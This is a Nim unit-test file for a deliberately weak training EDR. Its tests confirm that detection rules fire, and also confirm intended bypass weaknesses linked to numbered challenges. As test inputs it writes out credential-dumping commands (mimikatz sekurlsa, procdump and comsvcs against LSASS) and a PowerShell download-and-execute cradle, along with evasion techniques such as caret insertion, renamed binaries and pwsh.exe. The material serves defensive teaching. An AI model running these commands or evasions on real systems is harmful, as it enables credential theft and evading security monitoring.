## MostShittyEDR - Detection Rule Unit Tests
##
## Tests all 9 detection rules, verifying both detection AND intentional
## bypass weaknesses. Each test documents which challenge it validates.
##
## Run: nim c -r -d:testing tests/test_rules.nim
## Requires: winim (nimble install winim)

{.define: testing.}
import unittest
include ../src/edr_agent

# ============================================================
# Test Helpers
# ============================================================

proc mkProcess(name: string, cmd: string = "", path: string = ""): ProcessInfo =
  ProcessInfo(
    pid: 1234,
    parentPid: 1000,
    exeName: name,
    commandLine: cmd,
    imagePath: path
  )

proc mkConfig(profileApis: seq[string] = @[]): Config =
  Config(
    verbose: false,
    noKill: true,
    noEtw: true,
    pollInterval: 500,
    profile: HookProfile(name: "test", hookedApis: profileApis)
  )

# ============================================================
# Rule 1: Process Name Blacklist
# ============================================================

suite "Rule 1 - Process Name Blacklist":

  test "detects mimikatz.exe (exact match)":
    let dets = ruleProcessBlacklist(mkProcess("mimikatz.exe"))
    check dets.len == 1
    check dets[0].ruleId == 1
    check dets[0].severity == sCritical

  test "detects procdump64.exe":
    let dets = ruleProcessBlacklist(mkProcess("procdump64.exe"))
    check dets.len == 1

  test "detects notepad.exe (lab canary)":
    let dets = ruleProcessBlacklist(mkProcess("notepad.exe"))
    check dets.len == 1

  test "detects all blacklisted names":
    for name in BlacklistedProcesses:
      let dets = ruleProcessBlacklist(mkProcess(name))
      check dets.len == 1

  test "BYPASS: case sensitivity - Mimikatz.exe not detected (Challenge 2)":
    let dets = ruleProcessBlacklist(mkProcess("Mimikatz.exe"))
    check dets.len == 0

  test "BYPASS: MIMIKATZ.EXE not detected (Challenge 2)":
    let dets = ruleProcessBlacklist(mkProcess("MIMIKATZ.EXE"))
    check dets.len == 0

  test "BYPASS: renamed binary not detected (Challenge 1, 3)":
    let dets = ruleProcessBlacklist(mkProcess("totally_legit.exe"))
    check dets.len == 0

  test "BYPASS: unlisted tool not detected (Challenge 4)":
    let dets = ruleProcessBlacklist(mkProcess("SharpHound4.exe"))
    check dets.len == 0

  test "no detection for empty name":
    let dets = ruleProcessBlacklist(mkProcess(""))
    check dets.len == 0

  test "no detection for system processes":
    let dets = ruleProcessBlacklist(mkProcess("svchost.exe"))
    check dets.len == 0

# ============================================================
# Rule 2: Command Line Keyword Detection
# ============================================================

suite "Rule 2 - Command Line Keywords":

  test "detects 'sekurlsa' keyword":
    let dets = ruleSuspiciousKeywords(mkProcess("cmd.exe", "sekurlsa::logonpasswords"))
    check dets.len == 1
    check dets[0].ruleId == 2

  test "detects 'invoke-mimikatz'":
    let dets = ruleSuspiciousKeywords(mkProcess("powershell.exe", "Invoke-Mimikatz -DumpCreds"))
    check dets.len == 1

  test "detects 'downloadstring' (case insensitive)":
    let dets = ruleSuspiciousKeywords(mkProcess("powershell.exe", "IEX(New-Object Net.WebClient).DownloadString('http://x')"))
    check dets.len == 1

  test "detects 'comsvcs.dll'":
    let dets = ruleSuspiciousKeywords(mkProcess("rundll32.exe", "comsvcs.dll, MiniDump 672 dump.bin full"))
    check dets.len == 1

  test "BYPASS: caret insertion not detected (Challenge 6)":
    let dets = ruleSuspiciousKeywords(mkProcess("cmd.exe", "s^e^k^u^r^l^s^a"))
    check dets.len == 0

  test "BYPASS: env variable substitution not detected (Challenge 7)":
    let dets = ruleSuspiciousKeywords(mkProcess("cmd.exe", "%seku%rlsa"))
    check dets.len == 0

  test "no detection for clean commands":
    let dets = ruleSuspiciousKeywords(mkProcess("cmd.exe", "dir /s"))
    check dets.len == 0

  test "no detection for empty command line":
    let dets = ruleSuspiciousKeywords(mkProcess("cmd.exe", ""))
    check dets.len == 0

# ============================================================
# Rule 3: Reconnaissance Detection
# ============================================================

suite "Rule 3 - Reconnaissance Detection":

  test "detects 'whoami'":
    let dets = ruleReconDetection(mkProcess("cmd.exe", "whoami"))
    check dets.len == 1
    check dets[0].ruleId == 3
    check dets[0].severity == sWarning

  test "detects 'ipconfig /all'":
    let dets = ruleReconDetection(mkProcess("cmd.exe", "ipconfig /all"))
    check dets.len == 1

  test "detects 'systeminfo'":
    let dets = ruleReconDetection(mkProcess("cmd.exe", "systeminfo"))
    check dets.len == 1

  test "detects 'net user'":
    let dets = ruleReconDetection(mkProcess("cmd.exe", "net user administrator"))
    check dets.len == 1

  test "BYPASS: result is discarded by analyzeProcess (Challenge 9)":
    let reconDets = ruleReconDetection(mkProcess("cmd.exe", "whoami /all"))
    check reconDets.len == 1
    check reconDets[0].severity == sWarning

  test "no detection for non-recon commands":
    let dets = ruleReconDetection(mkProcess("cmd.exe", "echo hello"))
    check dets.len == 0

# ============================================================
# Rule 4: LSASS Dump Detection
# ============================================================

suite "Rule 4 - LSASS Dump Detection":

  test "detects procdump + lsass":
    let dets = ruleLsassDump(mkProcess("procdump.exe", "procdump -ma lsass.exe dump.dmp"))
    check dets.len == 1
    check dets[0].ruleId == 4
    check dets[0].severity == sCritical

  test "detects procdump + -ma flag":
    let dets = ruleLsassDump(mkProcess("procdump.exe", "procdump -ma 672"))
    check dets.len == 1

  test "detects comsvcs + lsass":
    let dets = ruleLsassDump(mkProcess("rundll32.exe", "comsvcs.dll MiniDump lsass"))
    check dets.len == 1

  test "BYPASS: tool name without 'lsass' keyword (Challenge 13)":
    let dets = ruleLsassDump(mkProcess("procdump.exe", "procdump 672 dump.dmp"))
    check dets.len == 0

  test "BYPASS: 'lsass' keyword without tool name (Challenge 14)":
    let dets = ruleLsassDump(mkProcess("custom_dumper.exe", "custom_dumper lsass.exe"))
    check dets.len == 0

  test "BYPASS: renamed tool bypasses (Challenge 14)":
    let dets = ruleLsassDump(mkProcess("pd64.exe", "pd64 -ma lsass.exe"))
    check dets.len == 0

  test "no detection for normal processes":
    let dets = ruleLsassDump(mkProcess("notepad.exe", ""))
    check dets.len == 0

# ============================================================
# Rule 5: PowerShell Analysis
# ============================================================

suite "Rule 5 - PowerShell Analysis":

  test "detects -encodedcommand":
    let dets = rulePowerShell(mkProcess("powershell.exe", "powershell.exe -EncodedCommand dABlAHMAdA=="))
    check dets.len == 1
    check dets[0].ruleId == 5

  test "detects -windowstyle hidden":
    let dets = rulePowerShell(mkProcess("powershell.exe", "powershell.exe -windowstyle hidden -file x.ps1"))
    check dets.len == 1

  test "detects bypass":
    let dets = rulePowerShell(mkProcess("powershell.exe", "powershell.exe -ep bypass"))
    check dets.len == 1

  test "detects iex(":
    let dets = rulePowerShell(mkProcess("powershell.exe", "powershell.exe -c iex(gc script.ps1)"))
    check dets.len == 1

  test "BYPASS: pwsh.exe not detected (Challenge 15)":
    let dets = rulePowerShell(mkProcess("pwsh.exe", "pwsh.exe -EncodedCommand dABlAHMAdA=="))
    check dets.len == 0

  test "BYPASS: PowerShell ISE not detected":
    let dets = rulePowerShell(mkProcess("powershell_ise.exe", "-encodedcommand abc"))
    check dets.len == 0

  test "no detection for clean powershell":
    let dets = rulePowerShell(mkProcess("powershell.exe", "powershell.exe Get-Process"))
    check dets.len == 0

  test "no detection for non-powershell":
    let dets = rulePowerShell(mkProcess("cmd.exe", "-encodedcommand test"))
    check dets.len == 0

# ============================================================
# Rule 6: Hash-Based Detection (Security Theater)
# ============================================================

suite "Rule 6 - Hash-Based Detection":

  test "returns empty when no signatures loaded (Challenge 20)":
    let saved = gSignatureHashes
    gSignatureHashes = @[]
    let dets = ruleHashCheck(mkProcess("malware.exe", "malware --evil"))
    check dets.len == 0
    gSignatureHashes = saved

  test "signature database is empty by default":
    check gSignatureHashes.len == 0

  test "sha256File returns 64-char hex for existing file":
    let h = sha256File(getAppFilename())
    check h.len == 64

  test "sha256File returns empty for nonexistent file":
    let h = sha256File("C:\\nonexistent_file_12345.exe")
    check h.len == 0

  test "detects file matching loaded signature":
    let selfHash = sha256File(getAppFilename())
    let saved = gSignatureHashes
    gSignatureHashes = @[selfHash]
    let info = mkProcess("test.exe", "", getAppFilename())
    let dets = ruleHashCheck(info)
    check dets.len == 1
    check dets[0].ruleId == 6
    gSignatureHashes = saved

  test "BYPASS: modified binary not detected (Challenge 29)":
    let saved = gSignatureHashes
    gSignatureHashes = @["aaaa" & "b".repeat(60)]
    let info = mkProcess("test.exe", "", getAppFilename())
    let dets = ruleHashCheck(info)
    check dets.len == 0
    gSignatureHashes = saved

# ============================================================
# Signature Loading
# ============================================================

suite "Signature Loading":

  test "loads valid signature file":
    let count = loadSignatures("signatures/malware_hashes.txt")
    check count >= 8
    check gSignatureHashes.len == count

  test "skips comments and empty lines":
    let count = loadSignatures("signatures/malware_hashes.txt")
    for h in gSignatureHashes:
      check not h.startsWith("#")
      check h.len == 64

  test "returns 0 for nonexistent file":
    let count = loadSignatures("nonexistent_file.txt")
    check count == 0

  test "all hashes are lowercase":
    discard loadSignatures("signatures/malware_hashes.txt")
    for h in gSignatureHashes:
      check h == h.toLowerAscii()

# ============================================================
# Rule 7: Hooked API Import Detection
# ============================================================

suite "Rule 7 - Hooked API Import Detection":

  test "no detection without profile":
    let emptyProfile = HookProfile(name: "", hookedApis: @[])
    let dets = ruleHookedApiImports(mkProcess("test.exe"), emptyProfile)
    check dets.len == 0

  test "no detection with empty imports":
    let profile = HookProfile(name: "test", hookedApis: @["NtAllocateVirtualMemory"])
    let info = mkProcess("test.exe", "", "")
    let dets = ruleHookedApiImports(info, profile)
    check dets.len == 0

  test "Zw/Nt normalization in profile":
    let profile = loadHookProfile("crowdstrike")
    for api in profile.hookedApis:
      check api.startsWith("Nt")
      check not api.startsWith("Zw")

# ============================================================
# Rule 8: ETW Integrity Check
# ============================================================

suite "Rule 8 - ETW Integrity":

  test "no alert when ETW is healthy":
    gEtwTamperAlerted = false
    gEtwSessionActive = false
    let dets = ruleEtwIntegrity()
    check dets.len == 0

  test "does not re-alert after first detection":
    gEtwTamperAlerted = true
    let dets = ruleEtwIntegrity()
    check dets.len == 0
    gEtwTamperAlerted = false

# ============================================================
# Rule 9: PE Structure Analysis
# ============================================================

suite "Rule 9 - PE Structure Analysis":

  test "returns valid analysis for own executable":
    let pe = analyzePeStructure(getAppFilename())
    check pe.valid == true
    check pe.sectionNames.len > 0

  test "returns invalid for nonexistent file":
    let pe = analyzePeStructure("C:\\nonexistent_binary_12345.exe")
    check pe.valid == false

  test "returns invalid for empty path":
    let pe = analyzePeStructure("")
    check pe.valid == false

  test "detects known packer section name 'UPX0'":
    let pe = PeAnalysis(
      valid: true,
      sectionNames: @["UPX0", "UPX1", ".rsrc"],
      hasPackerSections: true,
      packerName: "UPX",
      rwxSections: @[],
      hollowSections: @[],
      entryPointSection: "UPX1",
      entryInFirstSection: true
    )
    check pe.hasPackerSections == true
    check pe.packerName == "UPX"

  test "rulePeStructure returns no alerts for clean binary":
    let info = mkProcess("explorer.exe", "", getAppFilename())
    let dets = rulePeStructure(info)
    for d in dets:
      check d.ruleName != "PACKED_BINARY"

  test "rulePeStructure returns empty for nonexistent file":
    let info = mkProcess("fake.exe", "", "C:\\nonexistent_12345.exe")
    let dets = rulePeStructure(info)
    check dets.len == 0

  test "rulePeStructure returns empty for empty imagePath":
    let info = mkProcess("test.exe", "", "")
    let dets = rulePeStructure(info)
    check dets.len == 0

  test "own binary has standard section names":
    let pe = analyzePeStructure(getAppFilename())
    check pe.valid
    check ".text" in pe.sectionNames or ".code" in pe.sectionNames

  test "own binary has entry point in first section":
    let pe = analyzePeStructure(getAppFilename())
    check pe.valid
    check pe.entryInFirstSection == true

  test "BYPASS: renamed UPX sections not detected (Challenge 33)":
    let pe = PeAnalysis(
      valid: true,
      sectionNames: @[".text", ".rdata", ".rsrc"],
      hasPackerSections: false,
      packerName: "",
      rwxSections: @[],
      hollowSections: @[],
      entryPointSection: ".text",
      entryInFirstSection: true
    )
    check pe.hasPackerSections == false

  test "BYPASS: custom packer with normal names invisible (Challenge 34)":
    let info = mkProcess("loader.exe", "", getAppFilename())
    let dets = rulePeStructure(info)
    var hasPacked = false
    for d in dets:
      if d.ruleName == "PACKED_BINARY":
        hasPacked = true
    check hasPacked == false

  test "PackerSectionNames contains UPX variants":
    check "UPX0" in PackerSectionNames
    check "UPX1" in PackerSectionNames
    check "UPX!" in PackerSectionNames

  test "PackerSectionNames contains ASPack markers":
    check ".aspack" in PackerSectionNames
    check ".adata" in PackerSectionNames

# ============================================================
# Analysis Engine Integration
# ============================================================

suite "Analysis Engine":

  test "combines multiple rule detections":
    let info = mkProcess("mimikatz.exe", "mimikatz sekurlsa::logonpasswords")
    var dets: seq[Detection] = @[]
    dets.add ruleProcessBlacklist(info)
    dets.add ruleSuspiciousKeywords(info)
    check dets.len >= 2
    var ruleIds: seq[int] = @[]
    for d in dets:
      ruleIds.add(d.ruleId)
    check 1 in ruleIds
    check 2 in ruleIds

  test "recon detection is discarded by design":
    let info = mkProcess("cmd.exe", "whoami /all")
    let reconDets = ruleReconDetection(info)
    check reconDets.len >= 1
    check reconDets[0].ruleId == 3

  test "hash check empty without signatures":
    let info = mkProcess("malware.exe", "malware --execute")
    let saved = gSignatureHashes
    gSignatureHashes = @[]
    let hashDets = ruleHashCheck(info)
    check hashDets.len == 0
    gSignatureHashes = saved

  test "clean process returns no detections":
    let info = mkProcess("explorer.exe", "C:\\Windows\\explorer.exe")
    var dets: seq[Detection] = @[]
    dets.add ruleProcessBlacklist(info)
    dets.add ruleSuspiciousKeywords(info)
    dets.add ruleLsassDump(info)
    dets.add rulePowerShell(info)
    check dets.len == 0

# ============================================================
# Helper Functions
# ============================================================

suite "Helper Functions":

  test "wcharToStr converts basic ASCII":
    var buf: array[10, WCHAR]
    buf[0] = WCHAR(ord('H'))
    buf[1] = WCHAR(ord('i'))
    buf[2] = 0
    check wcharToStr(buf) == "Hi"

  test "wcharToStr handles empty string":
    var buf: array[10, WCHAR]
    buf[0] = 0
    check wcharToStr(buf) == ""

  test "wcharToStr replaces non-ASCII with '?'":
    var buf: array[10, WCHAR]
    buf[0] = WCHAR(0x00FC)  # ü
    buf[1] = 0
    check wcharToStr(buf) == "?"
